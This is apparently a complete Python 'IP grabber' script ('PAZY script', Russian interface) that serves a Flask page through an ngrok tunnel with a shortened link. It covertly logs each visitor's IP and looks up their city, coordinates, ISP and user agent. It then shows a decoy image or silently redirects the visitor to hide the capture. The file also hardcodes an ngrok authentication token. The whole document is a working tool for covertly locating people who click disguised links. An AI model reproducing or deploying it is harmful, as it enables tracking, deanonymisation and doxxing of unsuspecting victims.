import requests
from pyngrok import ngrok
import pyperclip
import pyshorteners
import requests, io
import random
import os
from flask import Flask, request, send_file
import logging
import psutil
from colorama import init, Fore, Back, Style
from time import sleep
import time
import json

pic = False
PICTURE = ''
init(convert=True)
ngrok_token = '22e0sQvV7ICbpO1qmdgV8Syd1ef_5YJ6wSFB1SjsbBxooUXoJ'  # Token -> https://dashboard.ngrok.com/get-started/setup

log = logging.getLogger('werkzeug')
log.disabled = True
log.setLevel(logging.ERROR)

app = Flask(__name__, template_folder='templates', static_folder='static')
app.logger.disabled = True
app.config['DEBUG'] = False
app.debug = False

@app.route('/', methods=['GET'])
def main():
    if request.headers.getlist("X-Forwarded-For"):
       ip = request.headers.getlist("X-Forwarded-For")[0]
    else:
       ip = request.remote_addr
    urll = 'http://ip-api.com/json/' + str(ip)
    response = requests.get(urll)
    data = response.json()
    country = data['country']
    times = data['timezone']
    provider = data['isp']
    city = data['city']
    lat = data['lat']
    lon = data['lon']
    browser = request.user_agent 
    print(f"\n{Fore.MAGENTA}[+] {Fore.CYAN} {time.strftime('%H:%M')} Информация о устройстве:\n" + '=' * 30 + '\n')
    print(f"{Fore.MAGENTA}[+] {Fore.CYAN} IP               : {Fore.WHITE}{ip}")
    print(f"{Fore.MAGENTA}[+] {Fore.CYAN} Город            : {Fore.WHITE}{city}")
    print(f"{Fore.MAGENTA}[+] {Fore.CYAN} Страна           : {Fore.WHITE}{country}")
    print(f"{Fore.MAGENTA}[+] {Fore.CYAN} Широта           : {Fore.WHITE}{lat}")
    print(f"{Fore.MAGENTA}[+] {Fore.CYAN} Долгота          : {Fore.WHITE}{lon}")
    print(f"{Fore.MAGENTA}[+] {Fore.CYAN} GoogleMap        : {Fore.WHITE}https://www.google.com/maps/@{lat},{lon},15z?hl=ru-RU")
    print(f"{Fore.MAGENTA}[+] {Fore.CYAN} Время            : {Fore.WHITE}{times}")
    print(f"{Fore.MAGENTA}[+] {Fore.CYAN} Провайдер        : {Fore.WHITE}{provider}")
    print(f"{Fore.MAGENTA}[+] {Fore.CYAN} User-Agent       : {Fore.WHITE}{browser}\n")

    print(f"\n{Fore.GREEN}[+] {Fore.CYAN} Ожидаем подключений людей...\n")
    if pic == True:
        return send_file(io.BytesIO(requests.get(PICTURE).content), mimetype='image/jpeg', download_name='img1.png')
    elif pic == False:
        return f'''
            </meta><meta http-equiv="refresh" content="0;URL={per}"/>
        '''
if __name__ == '__main__':
    os.system('cls')
    os.system('title PAZY script')

    for proc in psutil.process_iter():
        if proc.name() == 'ngrok':
            proc.kill()
            break

    print(f'''
    █▀█ ▄▀█ ▀█ █▄█   █▀ █▀▀ █▀█ █ █▀█ ▀█▀
    █▀▀ █▀█ █▄ ░█░   ▄█ █▄▄ █▀▄ █ █▀▀ ░█░
    by makor.developer
        \n''')
    print('''
        | 1) Image URL
        | 2) Text URL
    ''')
    answer = input('Ответ: ')
    if answer == '1':
        PICTURE = input('Введите адресс картинки: ')
        os.system('cls')
        pic = True
        print(f"{Fore.GREEN}[+] {Fore.CYAN}Генерируем URL!\n")
        ngrok.set_auth_token(ngrok_token)
        public_url = ngrok.connect(6666, 'http')
        url2 = str(public_url).replace('NgrokTunnel: "', '')
        url = url2.replace('" -> "http://localhost:6666"', '')
        print(f"{Fore.GREEN}[+] {Fore.CYAN}URL: {Fore.WHITE}" + url + "\n")
        sleep(0.1)
        print(f"{Fore.GREEN}[+] {Fore.CYAN}Ожидаем подключений людей...\n")
    elif answer == '2':
        per = input('Введите ссылку для переадрисации: ')
        os.system('cls')
        print(f"{Fore.GREEN}[+] {Fore.CYAN}Генерируем URL!\n")
        ngrok.set_auth_token(ngrok_token)
        public_url = ngrok.connect(6666, 'http')
        url2 = str(public_url).replace('NgrokTunnel: "', '')
        url = url2.replace('" -> "http://localhost:6666"', '')
        shorted = pyshorteners.Shortener().clckru.short(url)
        print(f"{Fore.GREEN}[+] {Fore.CYAN}URL: {Fore.WHITE}" + shorted + f" | {url}\n")
        sleep(0.1)
        print(f"{Fore.GREEN}[+] {Fore.CYAN}Ожидаем подключений людей...\n")
        
    app.run(
        host='0.0.0.0',
        debug=False,
        port=6666  # PORT
    )